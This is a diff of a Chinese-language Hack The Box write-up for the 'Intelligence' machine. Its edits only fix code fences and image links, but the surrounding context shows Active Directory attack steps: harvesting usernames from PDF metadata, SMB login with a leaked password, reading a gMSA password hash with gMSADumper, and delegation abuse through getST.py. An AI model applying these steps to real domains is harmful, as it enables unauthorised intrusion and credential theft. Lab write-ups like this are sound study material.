@@ -91,7 +91,7 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 `http://10.129.121.166/documents/2020-01-01-upload.pdf`
 
 可以看看能不能下載中間所有日期的文件
-```
+```bash
 ## date.sh
 d=2020-01-01
 while [ "$d" != 2020-12-30 ]; do 
@@ -130,13 +130,15 @@ After logging in please change your password as soon as possible.
 ```
 
 再用`exiftool`把`creator`全部蒐集起來
-```
+```bash
 ## creator.sh
 for file in *pdf
 do
    exiftool -Creator -s -S $file >> users.txt	
 done
+```
 
+```
 ┌──(kali㉿kali)-[~/htb]
 └─$ cat users.txt                                                                               
 Jennifer.Thomas
@@ -224,7 +226,9 @@ SMB         10.129.121.166  445    DC               [+] intelligence.htb\Tiffany
 └─$ smbclient -N //10.129.121.166/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876
 
 smb: \> get downdetector.ps1
+```
 
+```powershell
 ┌──(kali㉿kali)-[~/htb]
 └─$ cat downdetector.ps1                                                         
 ��# Check web server status. Scheduled to run every 5min
@@ -289,7 +293,7 @@ INFO: Compressing output into 20240603014521_bloodhound.zip
 
 丟壓縮檔進去之後，搜尋`TED.GRAVES`，點`Node Info` -> `OUTBOUND OBJECT CONTROL` -> `Group Delegated Object Control`
 
-![[Intelligence_1.png]]
+![Intelligence_1.png](picture/Intelligence_1.png)
 
 發現有`ReadGMSAPassword`，右鍵點他點`help`->`Linux Abuse`可以看到他利用[gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)，用他
 ```
@@ -306,7 +310,7 @@ svc_int$:aes128-cts-hmac-sha1-96:cc50179e1ce82827a22ef0ad4fab3bd9
 得到`svc_int$`的hash之後可以再看一下bloodhound
 點到`Analysis` -> `Shortest Path from Owned Principals`
 
-![[Intelligence_2.png]]
+![Intelligence_2.png](picture/Intelligence_2.png)
 
 一樣對`AllowedToDelegate`右鍵`help` -> `Linux Abuse`，他說[getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)，如果有error先用`ntpdate`
 ```
